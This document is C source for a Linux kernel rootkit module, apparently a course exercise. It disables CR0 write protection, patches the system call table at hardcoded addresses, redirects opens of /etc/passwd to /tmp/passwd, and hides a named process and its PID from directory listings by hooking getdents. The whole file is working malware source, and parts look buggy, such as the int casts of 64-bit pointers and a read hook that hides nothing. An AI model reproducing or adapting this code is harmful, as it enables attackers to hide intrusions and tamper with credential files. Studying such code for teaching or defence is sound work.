#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <asm/uaccess.h>


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81059d90;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81059df0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//dirent object for getdents()                                                                                                                                                                     
#define BUF_SIZE 1024
#define BUFFLEN 256

struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);

//Function pointer that saves address of original 'getdents' syscall
asmlinkage int (*original_call_dents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

//Function pointer that saves address of original 'read' syscall
asmlinkage int (*original_call_read)(int fd, void * buf, size_t count);

//Module Parameter - PID of sneaky_process
static int sneaky_pid;
module_param(sneaky_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  if(strncmp(pathname, "/etc/passwd", 11) == 0){
    printk(KERN_INFO "The user wants /etc/passwd. Lets hide it ...\n");
    const char * copy = "/tmp/passwd";
    if(copy_to_user(pathname, copy, 7) == -1){
      printk(KERN_INFO "copy_to_user failed!!\n");
    }
  }
  printk(KERN_INFO "Very, very Sneaky!\n");
  printk(KERN_INFO "sneaky_procees pid = %d\n", sneaky_pid);
  return original_call(pathname, flags);
}

//Define our new sneaky version of the 'read' syscall
asmlinkage int sneaky_read(int fd, void * buf, size_t count){
   int returnVal = original_call_read(fd, buf, count);
   char * modBuf = buf;
   while(modBuf < (buf + returnVal)){
     if(strcmp(modBuf, "sneaky_mod") == 0){
       printk(KERN_INFO "FOUND SNEAKY_MOD\n");
     }
     modBuf++;
   }
   return returnVal;
}

asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  struct linux_dirent * d = dirp;
  int bpos;
  int nread = original_call_dents(fd, dirp, count);
  char hideme [14] = "sneaky_process";
  char * buf = dirp;
  printk(KERN_INFO "Count : %d\n", nread);
  for (bpos = 0; bpos < nread;) {
    d = (struct linux_dirent *)(bpos + buf);
    int tf = 0;
    if(strlen(d->d_name) == 14){
      if(strncmp(hideme, d->d_name, 14) == 0){
	tf = 1;
      }
    }
    char str [20];
    sprintf(str,"%d", sneaky_pid);
    if(strcmp(str, d->d_name) == 0){
      tf = 1;
    }
    if(tf == 1){
      printk(KERN_INFO "Found sneaky_process: %s\n", d->d_name);
      int pos = bpos;
      char * next = (bpos + buf + d->d_reclen);
      char * curr = d;
      nread -= d->d_reclen;
      while(pos < nread){
	*curr = *next;
	pos++;
	curr++;
	next++;
      }
      printk(KERN_INFO "Replaced sneaky_process with: %s\n", d->d_name);
    }
    printk(KERN_INFO "In sneaky_getdents! name = %s\n", d->d_name);
    bpos += d->d_reclen;
  }
  printk(KERN_INFO "In sneaky_getdents! name = %s\n", d->d_name);  
  printk(KERN_INFO "IN sneaky_getdents! count = %d\n", count);
  printk(KERN_INFO "In sneaky_egtdents! nread = %d\n", nread);
  return nread; //original_call_dents(fd,dirp,nread);
}



//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
 
 struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  
  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  //Hijacks getdents
  original_call_dents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (int)sneaky_getdents;

  //Hijacks read()
  original_call_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (int)sneaky_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (int)original_call_dents;
  *(sys_call_table + __NR_read) = (int)original_call_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
